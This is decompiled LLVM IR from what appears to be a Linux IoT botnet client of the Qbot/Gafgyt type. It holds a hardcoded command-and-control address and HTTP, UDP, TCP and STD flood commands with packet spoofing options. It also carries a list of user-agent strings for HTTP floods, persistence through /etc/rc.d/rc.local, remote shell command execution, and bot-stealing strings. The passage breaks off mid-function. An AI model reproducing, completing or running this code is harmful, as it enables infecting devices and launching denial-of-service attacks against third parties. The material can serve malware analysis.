@global_var_231a0.386 = local_unnamed_addr global [443 x i8]* @global_var_18288.385
@global_var_194c8.388 = constant [6 x i8] c"arfgG\00"
@global_var_194d0.389 = constant [9 x i8] c"HBiug655\00"
@global_var_194dc.390 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_194ec.391 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_19500.392 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_19514.393 = constant [12 x i8] c"GJjyur67458\00"
@global_var_19520.394 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1952c.395 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_19538.396 = constant [10 x i8] c"KHGK7985i\00"
@global_var_19544.397 = constant [11 x i8] c"yuituiILYF\00"
@global_var_19550.398 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_19560.399 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1956c.400 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1957c.401 = constant [9 x i8] c"ewqdcftr\00"
@global_var_19588.402 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_19598.403 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_195a4.404 = constant [12 x i8] c"twehgbferhb\00"
@global_var_195b0.405 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_195bc.406 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_195cc.407 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_195dc.408 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_195ec.409 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_195f8.410 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_19608.411 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_19618.412 = constant [12 x i8] c"yteytietyue\00"
@global_var_19624.413 = constant [9 x i8] c"qsortEQS\00"
@global_var_19630.414 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_19640.415 = constant [4 x i8] c"std\00"
@global_var_19644.416 = constant [4 x i8] c"dts\00"
@global_var_19648.417 = constant [4 x i8] c"lsk\00"
@global_var_1964c.418 = constant [4 x i8] c"kek\00"
@global_var_19650.419 = constant [6 x i8] c"smack\00"
@global_var_19658.420 = constant [4 x i8] c"ily\00"
@global_var_1965c.421 = constant [4 x i8] c"tyf\00"
@global_var_19660.422 = constant [4 x i8] c"pos\00"
@global_var_19664.423 = constant [6 x i8] c"cunts\00"
@global_var_1966c.424 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_194c8.388, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_194d0.389, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_194dc.390, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_194ec.391, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_19500.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19514.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19520.394, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1952c.395, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19538.396, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19544.397, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19550.398, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19560.399, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1956c.400, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1957c.401, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19588.402, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19598.403, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_195a4.404, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_195b0.405, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195bc.406, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195cc.407, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195dc.408, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_195ec.409, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_195f8.410, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19608.411, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19618.412, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19624.413, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19630.414, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19640.415, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19644.416, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19648.417, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1964c.418, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19650.419, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19658.420, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1965c.421, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19660.422, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19664.423, i32 0, i32 0)]
@global_var_17598.426 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_175d8.427 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1761c.428 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_17660.429 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_176a4.430 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_176e8.431 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1772c.432 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_17770.433 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_177e0.434 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_17854.435 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_178a0.436 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_17928.437 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_17974.438 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_179e4.439 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_17a54.440 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_17ac8.441 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_17b40.442 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_17b88.443 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_17bb8.444 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_17bf8.445 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_17c44.446 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_17cbc.447 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_17d2c.448 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_17d9c.449 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_17e10.450 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_17ea4.451 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_17eec.452 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_17f34.453 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_17f74.454 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_17ff0.455 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_18058.456 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_180d4.457 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_18124.458 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_18178.459 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_181cc.460 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_18220.461 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_18274.462 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_2310c.463 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_17598.426, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_175d8.427, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1761c.428, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_17660.429, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_176a4.430, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_176e8.431, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1772c.432, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_17770.433, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_177e0.434, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17854.435, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_178a0.436, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17928.437, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_17974.438, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_179e4.439, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_17a54.440, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_17ac8.441, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_17b40.442, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_17b88.443, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_17bb8.444, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_17bf8.445, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_17c44.446, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_17cbc.447, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_17d2c.448, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_17d9c.449, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_17e10.450, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_17ea4.451, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_17eec.452, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_17f34.453, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_17f74.454, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_17ff0.455, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_18058.456, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_180d4.457, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18124.458, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_18178.459, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_181cc.460, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_18220.461, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_18274.462, i32 0, i32 0)]
@global_var_196fc.465 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_1973c.468 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_19758.470 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1977c.475 = constant [4 x i8] c"all\00"
@global_var_19780.477 = constant i32 44
@global_var_19784.479 = constant [4 x i8] c"syn\00"
@global_var_19788.481 = constant [4 x i8] c"rst\00"
@global_var_1978c.483 = constant [4 x i8] c"fin\00"
@global_var_19790.485 = constant [4 x i8] c"ack\00"
@global_var_19794.487 = constant [4 x i8] c"psh\00"
@global_var_19798.489 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_197ac.493 = constant [6 x i8] c"PONG!\00"
@global_var_197b4.495 = constant [6 x i8] c"PUSSY\00"
@global_var_197bc.497 = constant [4 x i8] c"OFF\00"
@global_var_29db0.499 = global i32 0
@global_var_197c0.501 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_197d0.503 = constant [3 x i8] c"ON\00"
@global_var_197d4.505 = constant [5 x i8] c"HTTP\00"
@global_var_197dc.507 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_19804.509 = constant [4 x i8] c"UDP\00"
@global_var_19808.511 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1987c.514 = constant [4 x i8] c"TCP\00"
@global_var_19880.516 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1993c.518 = constant [4 x i8] c"STD\00"
@global_var_19940.520 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1995c.522 = constant [5 x i8] c"STOP\00"
@global_var_23700.527 = local_unnamed_addr global i32 -1
@global_var_2319c.529 = global [20 x i8]* @global_var_18274.462
@global_var_19964.531 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1996c.534 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1997c.536 = constant [11 x i8] c"\0900000000\09\00"
@global_var_23b38.538 = global i32 0
@global_var_19988.540 = constant [10 x i8] c"BASSBOOTS\00"
@global_var_19994.542 = constant i32 0
@global_var_19998.544 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_199b0.548 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_199c0.550 = constant i32 47
@global_var_199c4.552 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_199cc.554 = constant i32 97
@global_var_199d0.556 = constant [13 x i8] c"fork failed\0A\00"
@global_var_199e0.560 = constant i32 993090331
@global_var_19a48.565 = constant [5 x i8] c"PONG\00"
@global_var_19a50.567 = constant [9 x i8] c"LELIMDUP\00"
@global_var_19a5c.569 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_19a70.571 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_19a7c.573 = constant [8 x i8] c"%s 2>&1\00"
@global_var_19a84.575 = constant [3 x i8] c"%s\00"
@global_var_19a88.577 = constant i32 32
@global_var_29d70.579 = global i32 0
@global_var_237ac = external global i32
@global_var_237b4 = external local_unnamed_addr global i32
@global_var_29d80.589 = global i32 0
@global_var_237e8.595 = global i32 0
@global_var_27b4c.597 = global i32 0
@global_var_12808.599 = constant i32 -481296384
@global_var_fd2c.600 = constant i32 -442564544
@global_var_27b50.602 = global i32 0
@global_var_23800.608 = global i32 2
@global_var_237d0.614 = global i32 0
@global_var_100e4.615 = constant i32 -442564492
@global_var_237cc.617 = global i32* bitcast (i8** @global_var_23804.584 to i32*)
@global_var_1a08c.623 = constant i32 0
@global_var_102a4.628 = constant i32 -382910448
@global_var_13eb8.629 = constant i32 -382909968
@global_var_13f74.630 = constant i32 -382910224
@global_var_1a0c0.632 = constant i32 135270416
@global_var_1a0a4.634 = constant [6 x i8] c"(nil)\00"
@global_var_1a0ac.637 = constant [7 x i8] c"(null)\00"
@global_var_1a0b4.639 = constant i32 2949163
@global_var_1a140.642 = constant i32 16843008
@global_var_1a128.644 = constant i32 327688
@global_var_1a120.649 = constant [8 x i8] c" +0-#'I\00"
@global_var_1a0c8.651 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1a108.653 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1a0fb.655 = constant i32 117506048
@global_var_1a0fc.657 = constant i32 252117248
@global_var_1a0ec.659 = constant i32 331776
@global_var_1a0dc.661 = constant i32 335616
@global_var_117fc.693 = constant i32 -456978431
@global_var_1a15c.699 = constant [8 x i8] c"Success\00"
@global_var_1a14c.701 = constant [15 x i8] c"Unknown error \00"
@global_var_1adea.703 = constant i32 65536
@global_var_23ae8.704 = global i32* @global_var_1adea.703
@global_var_29b54.707 = global i32 0
@global_var_29b58.710 = global i32 0
@global_var_29d34.712 = global i32 0
@global_var_29b68.714 = global i32 0
@global_var_23af0.716 = global i32 0
@global_var_29e6c.721 = global i32 0
@global_var_29e60.724 = global i32 0
@global_var_29db8.726 = global i32 0
@global_var_29d48.728 = global i32 0
@global_var_239f0.731 = global i32 256
@global_var_238f4.732 = global i32* @global_var_239f0.731
@global_var_29e38.736 = global i32 0
@global_var_13cfc.737 = constant i32 -382910416
@global_var_12888.744 = constant i32 -442564520
@global_var_239fc.750 = global i32 0
@global_var_faf8.752 = constant i32 -481230848
@global_var_29d60.754 = global i32 0
@global_var_f6e4.756 = constant i32 -509587456
@global_var_23a14.758 = global i32 0
@global_var_23a2c = external global i32
@global_var_23a4c.764 = global i32 -1726662223
@global_var_23a34.771 = local_unnamed_addr global i32* @global_var_23a4c.764
@global_var_23a30.773 = global i32* @global_var_23a4c.764
@global_var_1acb8.787 = constant i32 0
@global_var_23ac8.796 = global i32 0
@global_var_29d64.800 = local_unnamed_addr global i32 0
@global_var_101ec.803 = constant i32 -382910416
@global_var_29d6c.805 = global i32 0
@global_var_230e8.809 = global i32 -1
@global_var_29d74.812 = global i32 0
@global_var_29d78.814 = local_unnamed_addr global i32 0
@global_var_137c0.815 = constant i32 -390234096
@global_var_1ace0.817 = constant [10 x i8] c"/dev/null\00"
@global_var_29d7c.819 = global i32 0
@global_var_1016c.823 = constant i32 -382909968
@global_var_29d68.825 = local_unnamed_addr global i32 0
@global_var_11770.828 = constant i32 -369095438
@global_var_23ae0 = external local_unnamed_addr global i32
@global_var_fbf8.839 = constant i32 -442564608
@global_var_13a88.841 = constant i32 -335544720
@global_var_13bc0.844 = constant i32 -275775369
@global_var_29da4.846 = global i32 0
@global_var_29d84.848 = global i32 0
@global_var_1afec.850 = constant [4 x i8] c"inf\00"
@global_var_1afef.854 = constant i32 1179535616
@global_var_1affc.856 = constant i32 2883630
@global_var_113f8.858 = constant i32 -382908944
@global_var_29d88.866 = global i32 0
@global_var_29da0.871 = local_unnamed_addr global i32 0
@global_var_f738.876 = constant i32 -382910448
@global_var_29e70.879 = global i32 0
@global_var_1b048.881 = constant i32 46
@global_var_29e50.883 = global i32 0
@global_var_159c4.885 = constant i32 -369098656
@global_var_1b04c.892 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1b060.894 = constant i32 114
@global_var_1b064.896 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1b07c.899 = constant [11 x i8] c"nameserver\00"
@global_var_1b088.902 = constant [7 x i8] c"domain\00"
@global_var_1b090.904 = constant [7 x i8] c"search\00"
@global_var_29e74.909 = global i32 0
@global_var_29e78.911 = global i32 0
@global_var_1b0ac.920 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1b098.922 = constant i32 0
@global_var_1b0c0.925 = constant [3 x i8] c"%x\00"
@global_var_1b0c4.928 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1b0d0.930 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_230ec.934 = global i32 0
@global_var_23b0c.5 = external global i8*
@global_var_23b43.74 = external global i8*
@global_var_23b44.75 = local_unnamed_addr global i8 0
@global_var_23b45.76 = local_unnamed_addr global i8 0
@global_var_23b46.77 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_23804.584 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_23854.585 = local_unnamed_addr global i8 16
@global_var_137d4.591 = constant i8 0
@global_var_23805.620 = local_unnamed_addr global i8 1
@global_var_23855.621 = local_unnamed_addr global i8 1
@3 = internal constant [2 x i8] c"\01\00"
@global_var_23aec.873 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_23aed.874 = local_unnamed_addr global i8 0
@global_var_199ac.546 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_23b0c.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_23b0c.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_23104.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_23104.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_23104.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_23104.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_23b0c.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_23104.8, { 1, 0 }
  uselistorder i8** @global_var_23b0c.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_230f8.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_230f8.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_230f8.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_230f8.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e628.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 95620, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
